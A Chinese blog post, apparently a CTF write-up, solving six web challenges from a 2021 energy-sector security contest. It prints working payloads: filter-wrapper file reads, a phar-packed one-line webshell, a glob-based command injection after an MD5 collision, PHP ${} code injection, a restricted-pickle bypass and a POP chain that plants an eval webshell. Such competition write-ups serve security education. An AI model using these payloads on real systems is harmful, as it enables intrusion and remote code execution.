<!--yml
category: 未分类
date: 2022-04-26 14:18:38
-->

# CTF-2021中国能源网络WEB题目全解_wulanlin的博客-CSDN博客

> 来源：[https://blog.csdn.net/wulanlin/article/details/122254933](https://blog.csdn.net/wulanlin/article/details/122254933)

## **0x01 前言**

在2021年10月15日的“中国能源网络安全大赛”，笔者对WEB题目进行了尝试，幸运的做出了所有题目。

感觉WEB的考点形形色色，其中有1道偏于黑盒测试的简单题目，4道是白盒审计类题目，还有一道是Python的反序列化题目，题目名称大致如下：

![](img/ca01d287fa2ae1cf5cf5f969695b995a.png)

因为唯一的一道黑盒题目还是文件包含题目，所以笔者将题目源代码全部扒下来了，给大家提供复现环境。（flag自己创建）。

![](img/28750befccf50b99fe9e369ef2620dc5.png)

下面笔者将分享这次比赛的解题过程。

## **0x02 ezphp**

这是一道很简单的题目，同时也被大家刷成了签到题。

打开界面显示如下：

![](img/444044d8d4d740cbe72746f0bb68a441.png)

单机按钮后会返回源代码，如图：

![](img/7b299154265bcb4c26645c2c779af36f.png)

这里MD5的判断已经是千年老题了，使用数组就可以绕过。

问题是下面的$res的结果不可以包含flag字符串，这里的话我们可以通过php伪协议将它进行base64加密绕过即可。但是我们可以注意到$request_url中间是拼接了一个url地址的，如图：

![](img/00929bbce41a6ebce04330a2c21cd163.png)

这里我们可以将php伪协议拆分成两段，例如：

php://filter/read=convert.base64-encode/****v/popular/all****/resource=/flag，这样虽然PHP会抛出异常，但是也是可以正常运行的，如图：

![](img/fa2d7d893e76f0ce3b9000530791c572.png)

Base64解密获得flag：

![](img/082f2ef46dad608690f228f8db25cd96.png)

## **0x03 phar**

这道题有一定的黑盒成分，也是比较简单的一道题目，首页如下：

![](img/883ae23794930f64fc77e56e63ea2d47.png)

我们可以看到这里给出了一个hint，那么访问include.php看一下，如图：

![](img/1cfd5fec5f08ad95ec6434df9299f49f.png)

给出了提示，说参数的key值为file，那么包含/etc/passwd看一下结果：

![](img/a68ca99c6c515bbcfa059f9354ef7dec.png)

显然这里包含失败了，在这里我们只能对源代码的编写进行猜测，这里有两条路可选：

> 1: 程序写法为 include $_GET[file] . '.xxx'; 针对这一种情况，我们可以fuzz后缀到底是什么，然后再进行读源码或包含一系列操作。
> 
> 2: 显然这一条路是比较离谱的，也就是说，根据题目名为phar，是否考点为phar反序列化？或者这里存在一个辅助的class.php文件，只是我们不知道class的文件名而已，但是由于这里的hint为include.php，显然这一条路是比较离谱的。

那么这里可以包含以下include，如图：

![](img/89816972172d4a42b72fef45dd8bf9ce.png)

显然形成自己包含自己，后缀确定为.php，使用伪协议阅读源码：

![](img/bdf27327c742209a98bae88a8536da4f.png)

这里不让使用base，那么我们可以使用url二次编码绕过，将“e”字符进行二次编码，如图：

![](img/284f0921ea919ddf1e273549ee54782d.png)

怼出php源码：

![](img/95db2a3faa85377cc42735fe918720e8.png)

根据hint.php找到上传点upload.php，这里读取upload.php源码，如图：

![](img/f7c2718d4571a26199599a22d73384cb.png)

这里限制了后缀与mime类型，但是没关系，我们可以上传后缀为jpg的phar文件，在phar文件中存放一个1.php为一句话木马，包含即可，如图：

![](img/bfe53fe71742c61fbee6ff0bb1f28604.png)

然后phar包含：

![](img/ba6bdbbc0654e873761d2923c324c41f.png)

## **0x04 HardCode**

![](img/30837528110f8053141d92cca6caf9bc.png)

这里第一个if判断使用md5强碰撞即可。

> M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

> M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

下面的preg_match过滤也是比较严格的，这里首先判断版本号，笔者通过http头发现php版本为5.2.9版本，如图：

![](img/ccdb11211284bb1a8891822274fd9496.png)

显然这里的preg_match只是多了一个@符号的限制，但是我们还是可以通过Linux的通配符来匹配的，如图：@的ASCII：

![](img/feec1dbafc3a176b48f2539b9b95ad6c.png)

那么根据题目中的过滤0-9，我们可取的也就是@与数字9中间的特殊符号：

![](img/1072fd6c33ae4145f9c6168738095a3e.png)

这里笔者取“>”，完整的正则写为[\>-[]。

构造Payload：

> x=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&y=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&code=`.%20/???/????????[\>-[]`

如图：

![](img/87cce9e5e5c9c78090b5fb651eace24d.png)

睡眠3秒，这里可以直接反弹shell。

![](img/402f7332dc5ae67e1ab620edb86934fe.png)

## **0x05 CODE**

![](img/c601bff492b06515be087dcb3b65e3ef.png)

毫无卵用的加密，然后对eval一步一步echo得出如下源代码：

| <?php// error_reporting(E_NOTICE);highlight_file(__FILE__);@session_start();$username = @$_GET['whoami'];if(!@isset($username['admin'])&#124;&#124;$username['admin'] != @md5($_SESSION['username'])) {die('error!');} else {if(isset($_GET['code'])) {$admin = $_GET['code'];$admin = addslashes($admin);if(preg_match('/\{openlog&#124;syslog&#124;readlink&#124;symlink&#124;popepassthru&#124;stream_socket_server&#124;scandir&#124;assert&#124;pcntl_exec&#124;fwrite&#124;curl&#124;system&#124;eval&#124;assert&#124;flag&#124;passthru&#124;exec&#124;system&#124;chroot&#124;chgrp&#124;chown&#124;shell_exec&#124;proc_open&#124;proc_get_status&#124;popen&#124;ini_alter&#124;ini_restore([^}]+)\}/i' , $admin)) {die('error!');}if (intval($admin)) {eval('"' .$admin .('"./hh.php"') .')}}";');}} else {eval('$flag="' .$admin . '";');}}?> |

这里$_SESSION[username]是null，所以我们只要使用一个空的md5串就行：whoami[admin]=d41d8cd98f00b204e9800998ecf8427e

下面$_GET[code]经过了addslashes函数，无法闭合下面eval('"' .$admin .('"./hh.php"') .')}}";');的双引号，我们打印一下如图：

![](img/12057a24ff0d0feb4f415ac2939ee8f7.png)

这里肯定回抛出一个语法错误的，因为语法格式是错误的。

但是在双引号包裹${}进行执行还有一个姿势，如图：

![](img/4e1836fb78f9c9bf5ad9d9dee6d09ccf.png)

这种写法就允许了两对双引号在未经反斜杠转义下的解析。

那么构造Payload：?whoami[admin]=d41d8cd98f00b204e9800998ecf8427e&code=1${${print(

![](img/c096c1b4b6b9aff5e104e089fb12bf47.png)

这样成功输出了./hh.php，在preg_match中并没有过滤反引号，我们可以通过反引号来执行命令，如图：

![](img/3b4eccbe8563939ff96cb8c2b07ec25d.png)

放在题目中查看flag位置，如图：

![](img/1602f0eb8492dabc3d4974272f0fbaa8.png)

但是在preg_match中过滤了“flag”字符，这里可以使用Linux的通配符来匹配，如图：

![](img/e271e900437c77bb28def0aacccba0b0.png)

## **0x06 EZpy**

阅读源代码：

| import base64import ioimport sysimport pickleimport bfrom flask import Flask, Response, render_template, requestapp = Flask(__name__)def read(filename, encoding='utf-8'):with open(filename, 'r', encoding=encoding) as fin:return fin.read()class people:def __init__(self, name, sex, age):self.name = nameself.sex = sexself.age=agedef __repr__(self):return f'people(name={self.name!r}, category={self.sex!r}, age={self.age!r})'#==判断def __eq__(self, other):return type(other) is  people and self.name == other.name and self.sex == other.sex and self.age==other.ageclass RestrictedUnpickler(pickle.Unpickler):def find_class(self, module, name):if module[0:8] == '__main__':return getattr(sys.modules['__main__'], name)raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))def here_load(s):return RestrictedUnpickler(io.BytesIO(s)).load()@app.route('/',methods=['GET','POST'])def index():if request.args.get('source'):return Response(read(__file__),mimetype='text/plain')else:return Response("/?source=")@app.route('/app', methods=['GET', 'POST'])def inll():if request.method == 'POST':try:pickle_data = request.form.get('data')if b'R' in base64.b64decode(pickle_data):return 'no no no'else:result = here_load(base64.b64decode(pickle_data))if type(result) is not people:return '？？？？'correct = (result == people(b.name, b.sex, b.age))if correct:return Response(read('/flag.txt'))except Exception as e:return Response(str(e))test = people('test', 'test','55')pickle_data = base64.b64encode(pickle.dumps(test)).decode()return Response(pickle_data)if __name__ == '__main__':app.run(host='0.0.0.0', port=8000) |

![](img/f0a62efda3d60000d637d114f1710035.png)

这里过滤了R指令码，那么跟进here_load方法，如图：

![](img/edf137c3506997501ce8fe89a6dbaaa5.png)

这里指明了只可以获取__main__模块下的包，那么这里命令执行暂时先不考虑，我们继续往下看代码：

![](img/13877217b70807cf4fd2521739d15fc2.png)

将反序列化出来的对象与people对象进行比较，默认比较应该按照地址进行比较，但是这里的people类写了__eq__魔术方法，这里的比较就只是生成出来的对象的属性比较了，如图：

![](img/cff2e3821c4bd54027d4296ead99cc52.png)

那么我们就可以通过Python反序列化，去修改b包中的name，sex，age属性，并且再生成一个people对象，经过__eq__的比较，即可获取flag.txt的内容，编写POC：

| import base64data=b'c__main__\nb\n}(Vname\nVtest\nVage\nV13\nVsex\nVnan\nub0c__main__\npeople\n)\x81}(Vname\nVtest\nVage\nV13\nVsex\nVnan\nub.'print(base64.b64encode(data)) |

发送Payload：

![](img/99729d480f20f646bda927ca3c10649b.png)

获取flag。

## **0x07 ezp0p**

纯纯的代码审计题目：

| <?phperror_reporting(0);highlight_file(__FILE__);class This{protected $formatters;public function want(){echo "what do you want to do?";}public function __call($method, $attributes){return $this->format($method, $attributes);}public function format($formatter, $arguments){$this->getFormatter($formatter)->patch($arguments[0][1][0]);}public function getFormatter($formatter){if (isset($this->formatters[$formatter])) {return $this->formatters[$formatter];}}}class Easy{protected $events;protected $event;public function __destruct(){$this->events->dispatch($this->event);}public function welcome(){echo "welcome CTFer!";}}class Ctf{protected $ban;protected $cmd;public function upup(){echo "upupupupupupup!";}public function __construct(){$this->ban='script';$this->cmd='whoami';}public function dispatch($cmd){call_user_func_array("script",$cmd);}}class Gema{protected $xbx;public function gema(){echo "wish you like this ezp0p!";}public function __construct(){$this->xbx='script';}public function patch($Fire){call_user_func($this->xbx,$Fire);}}if($_POST['x']!=$_POST['y'] && md5($_POST['x'])===md5($_POST['y'])){if(file_get_contents(substr($_POST['x'],0,20))!=null){@unserialize(base64_decode($_POST['data']));}else{die('To read this file??');}}else{die('maybe you are right??');}?> |

首先这里的unserialize函数是一个门槛，如图：

![](img/264487d152c25970064f8bad1a16cbf7.png)

要求file_get_contents必须读出内容，再加上前面的md5判断，我们这里可以使用fastcoll生成md5的前20位为./././././/index.php，然后进行MD5强碰撞即可。

![](img/eab40303af62fb4cef63c818b0deec56.png)

下面进行挖掘POP链路，如图：

![](img/636f6aff6b4c030ca0e6bca9e7f9644a.png)

编写POC：

| <?phpclass Gema {protected $xbx = 'assert';}// AAAAAAAAAAAAAAclass This {protected $formatters = ['dispatch' => 'obj...'];public function __construct($obj){$this -> formatters['dispatch'] = $obj;}}class Easy{protected $events;protected $event = [1 => ['eval($_REQUEST["c"])']];public function __construct($obj){$this -> events = $obj;}}$obj = new Easy(new This(new Gema()));echo base64_encode(serialize($obj)); |

获取Flag：

![](img/b02ab66d4baa433b4e40fbfea38d1bc2.png)